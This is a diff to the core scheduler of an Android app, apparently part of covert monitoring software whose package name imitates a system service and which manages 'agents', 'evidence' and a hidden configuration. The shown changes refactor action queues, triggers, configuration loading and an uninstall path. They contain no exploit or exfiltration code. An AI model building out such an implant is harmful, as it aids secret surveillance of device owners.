@@ -14,18 +14,20 @@ import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
+import com.android.service.Core.CheckAction;
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
-import com.android.service.agent.AgentManager;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
-import com.android.service.event.EventManager;
+import com.android.service.event.BaseEvent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
+import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -51,11 +53,14 @@ public class Core extends Activity implements Runnable {
 	private ContentResolver contentResolver;
 
 	/** The agent manager. */
-	private AgentManager agentManager;
+	private ManagerAgent agentManager;
 
 	/** The event manager. */
-	private EventManager eventManager;
+	private ManagerEvent eventManager;
 	private WakeLock wl;
+	//private long queueSemaphore;
+	private Thread fastQueueThread;
+	private CheckAction checkActionFast;
 
 	/**
 	 * Start.
@@ -68,8 +73,8 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Start(final Resources r, final ContentResolver cr) {
 		coreThread = new Thread(this);
-		agentManager = AgentManager.self();
-		eventManager = EventManager.self();
+		agentManager = ManagerAgent.self();
+		eventManager = ManagerEvent.self();
 
 		resources = r;
 		contentResolver = cr;
@@ -128,7 +133,7 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: init task"); //$NON-NLS-1$
 				}
 
-				int confLoaded=taskInit();
+				int confLoaded = taskInit();
 				// viene letta la conf e vengono fatti partire agenti e eventi
 				if (confLoaded == ConfType.Error) {
 					if (Cfg.DEBUG) {
@@ -178,34 +183,26 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	private void stopAll() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (stopAll)");
-		}
-		final Status status = Status.self();
-		// status.setRestarting(true);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-		status.unTriggerAll();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
-		}
-		agentManager.stopAll();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
-		}
-		eventManager.stopAll();
-		Utils.sleep(2000);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
-		}
-		status.unTriggerAll();
+	private synchronized Exit checkActions() {
 
-		final LogDispatcher logDispatcher = LogDispatcher.self();
-		if (!logDispatcher.isAlive()) {
-			logDispatcher.waitOnEmptyQueue();
-			logDispatcher.halt();
+		checkActionFast = new CheckAction(Action.FAST_QUEUE);
+
+		fastQueueThread = new Thread(checkActionFast);
+		fastQueueThread.start();
+
+		return checkActions(Action.MAIN_QUEUE);
+
+	}
+
+	class CheckAction implements Runnable {
+
+		private final int queue;
+
+		CheckAction(int queue) {
+			this.queue = queue;
+		}
+		public void run() {
+			Exit ret = checkActions(queue);
 		}
 	}
 
@@ -215,19 +212,24 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @return true, if successful
 	 */
-	private Exit checkActions() {
+	private Exit checkActions(int qq) {
 		final Status status = Status.self();
 
 		try {
 			while (!bStopCore) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " checkActions"); //$NON-NLS-1$
+					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
-				final int[] actionIds = status.getTriggeredActions();
+				final Trigger[] actionIds = status.getTriggeredActions(qq);
 
-				for (final int actionId : actionIds) {
-					final Action action = status.getAction(actionId);
-					final Exit exitValue = executeAction(action);
+				if(actionIds.length == 0){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
+					}
+				}
+				for (final Trigger trigger : actionIds) {
+					final Action action = status.getAction(trigger.getActionId());
+					final Exit exitValue = executeAction(action, trigger);
 
 					if (exitValue == Exit.UNINSTALL) {
 						if (Cfg.DEBUG) {
@@ -256,6 +258,37 @@ public class Core extends Activity implements Runnable {
 			}
 
 			return Exit.ERROR;
+		}
+	}
+
+	private void stopAll() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopAll)");
+		}
+		final Status status = Status.self();
+		// status.setRestarting(true);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
+		}
+		status.unTriggerAll();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
+		}
+		agentManager.stopAll();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
+		}
+		eventManager.stopAll();
+		Utils.sleep(2000);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
+		}
+		status.unTriggerAll();
+
+		final LogDispatcher logDispatcher = LogDispatcher.self();
+		if (!logDispatcher.isAlive()) {
+			logDispatcher.waitOnEmptyQueue();
+			logDispatcher.halt();
 		}
 	}
 
@@ -302,12 +335,12 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
 			}
 
-			if (agentManager.startAll() == false) {
+			/*if (agentManager.startAll() == false) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
 				}
 				return ConfType.Error;
-			}
+			}*/
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
@@ -389,7 +422,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config),0); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -410,16 +443,24 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private boolean loadConfFile(AutoFile file, boolean instantiate) {
-		boolean loaded;
-		final byte[] resource = file.read(8);
+		boolean loaded = false;
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConfFile): " + file);
+			}
+			final byte[] resource = file.read(8);
+			// Initialize the configuration object
+			Configuration conf = new Configuration(resource);
+			// Load the configuration
+			loaded = conf.loadConfiguration(instantiate);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
+			}
 
-		// Initialize the configuration object
-		final Configuration conf = new Configuration(resource);
-
-		// Load the configuration
-		loaded = conf.loadConfiguration(instantiate);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
+		} catch (GeneralException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConfFile) Error: " + e);
+			}
 		}
 		return loaded;
 	}
@@ -429,9 +470,10 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @param action
 	 *            the action
+	 * @param baseEvent 
 	 * @return the int
 	 */
-	private Exit executeAction(final Action action) {
+	private Exit executeAction(final Action action, Trigger trigger) {
 		Exit exit = Exit.SUCCESS;
 
 		if (Cfg.DEBUG) {
@@ -461,14 +503,14 @@ public class Core extends Activity implements Runnable {
 				}
 
 				subAction.prepareExecute();
-				final boolean ret = subAction.execute();
+				final boolean ret = subAction.execute(trigger);
 
 				if (status.uninstall) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
 					}
 
-					UninstallAction.actualExecute();
+					//UninstallAction.actualExecute();
 
 					exit = Exit.UNINSTALL;
 					break;
@@ -494,6 +536,7 @@ public class Core extends Activity implements Runnable {
 				}
 			} catch (final Exception ex) {
 				if (Cfg.DEBUG) {
+					Check.log(ex);
 					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
 				}
 			}
